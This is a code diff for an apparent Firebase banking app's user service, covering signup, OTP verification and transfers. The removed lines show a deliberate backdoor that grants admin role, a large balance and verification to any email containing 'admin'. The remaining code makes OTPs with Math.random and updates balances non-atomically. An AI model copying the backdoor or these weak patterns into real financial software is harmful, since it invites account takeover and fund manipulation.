@@ -20,21 +20,18 @@ export const createUserProfile = async (uid, email, fullName) => {
   try {
     const userRef = doc(db, "users", uid);
     
-    // Auto-promote logic
-    const isSecretAdmin = email.toLowerCase().includes('admin');
-    
     // Generate 6-digit OTP
     const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
 
     await setDoc(userRef, {
       email: email,
       fullName: fullName || "",
-      balance: isSecretAdmin ? 1000000 : 0, 
+      balance: 0, 
       accountNumber: Math.floor(Math.random() * 10000000000).toString().padStart(10, '0'),
-      role: isSecretAdmin ? "admin" : "customer",
+      role: "customer",
       status: "active",
       verificationCode: verificationCode,
-      isEmailVerified: isSecretAdmin ? true : false,
+      isEmailVerified: false, // Strict: Everyone must verify
       createdAt: serverTimestamp()
     });
 
@@ -95,6 +92,21 @@ export const restrictUserAccount = async (uid, subject, message) => {
   }
 };
 
+// Reset verification for new session (2FA)
+export const resetUserVerification = async (uid) => {
+  try {
+    const userRef = doc(db, "users", uid);
+    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+    await updateDoc(userRef, {
+      isEmailVerified: false,
+      verificationCode: newCode
+    });
+    return { error: null, verificationCode: newCode };
+  } catch (error) {
+    return { error: error.message };
+  }
+};
+
 // Validate user OTP
 export const verifyUserOTP = async (uid, code) => {
   try {
@@ -104,13 +116,12 @@ export const verifyUserOTP = async (uid, code) => {
     
     const data = userSnap.data();
     if (data.verificationCode !== code) {
-      throw new Error("Invalid verification code. Please try again.");
+      throw new Error("Invalid One-Time Password (OTP). Please try again.");
     }
 
-    // Code matches, verify user
     await updateDoc(userRef, {
       isEmailVerified: true,
-      verificationCode: null // Clear code for security
+      verificationCode: null 
     });
 
     return { error: null };
@@ -119,39 +130,81 @@ export const verifyUserOTP = async (uid, code) => {
   }
 };
 
+// Generate OTP for a specific transaction
+export const generateTransactionOTP = async (uid) => {
+  try {
+    const userRef = doc(db, "users", uid);
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    await updateDoc(userRef, { transactionOTP: code });
+    return { error: null, code };
+  } catch (e) {
+    return { error: e.message };
+  }
+};
+
+// Verify transaction OTP
+export const verifyTransactionOTP = async (uid, code) => {
+  try {
+    const userSnap = await getDoc(doc(db, "users", uid));
+    const data = userSnap.data();
+    if (data.transactionOTP !== code) throw new Error("Invalid Transaction OTP.");
+    await updateDoc(doc(db, "users", uid), { transactionOTP: null });
+    return { error: null };
+  } catch (e) {
+    return { error: e.message };
+  }
+};
+
 // Create a new transaction (transfer funds)
-export const createTransaction = async (uid, amount, recipientAccount, description) => {
+export const createTransaction = async (uid, amount, recipientAccount, description, transferType = 'internal') => {
   try {
     const userRef = doc(db, "users", uid);
     const userSnap = await getDoc(userRef);
     
     if (!userSnap.exists()) throw new Error("User not found");
     const currentBalance = parseFloat(userSnap.data().balance || 0);
-    const senderAccount = userSnap.data().accountNumber;
     
     if (currentBalance < amount) {
-      throw new Error("Insufficient funds");
+      throw new Error("Insufficient funds for this transaction.");
     }
 
-    // Step 1: Find recipient by account number
-    const usersRef = collection(db, "users");
-    const q = query(usersRef, where("accountNumber", "==", recipientAccount));
-    const querySnapshot = await getDocs(q);
-    
-    if (querySnapshot.empty) {
-      throw new Error("Recipient account not found. Please check the account number.");
-    }
-    
-    const recipientDoc = querySnapshot.docs[0];
-    const recipientId = recipientDoc.id;
-    const recipientBalance = parseFloat(recipientDoc.data().balance || 0);
+    // Handle Internal Recipient (Only if internal)
+    if (transferType === 'internal') {
+       const usersRef = collection(db, "users");
+       const q = query(usersRef, where("accountNumber", "==", recipientAccount));
+       const querySnapshot = await getDocs(q);
+       
+       if (querySnapshot.empty) {
+         throw new Error("Recipient account not found within Nova Bank. Please use External Transfer for other banks.");
+       }
+       
+       const recipientDoc = querySnapshot.docs[0];
+       const recipientRef = doc(db, "users", recipientDoc.id);
+       const recipientBalance = parseFloat(recipientDoc.data().balance || 0);
 
-    // Step 2: Deduct from sender
+       // Credit recipient
+       await updateDoc(recipientRef, {
+         balance: recipientBalance + amount
+       });
+       
+       // Log for recipient
+       await addDoc(collection(db, "transactions"), {
+         userId: recipientDoc.id,
+         amount: amount,
+         senderAccount: userSnap.data().accountNumber,
+         description: "Inward Transfer",
+         status: "completed",
+         type: "deposit",
+         timestamp: serverTimestamp()
+       });
+    }
+
+    // Deduct from sender (Always)
     await updateDoc(userRef, {
       balance: currentBalance - amount
     });
 
-    // Step 3: Log transaction for sender
+    // Log for sender
     await addDoc(collection(db, "transactions"), {
       userId: uid,
       amount: -amount,
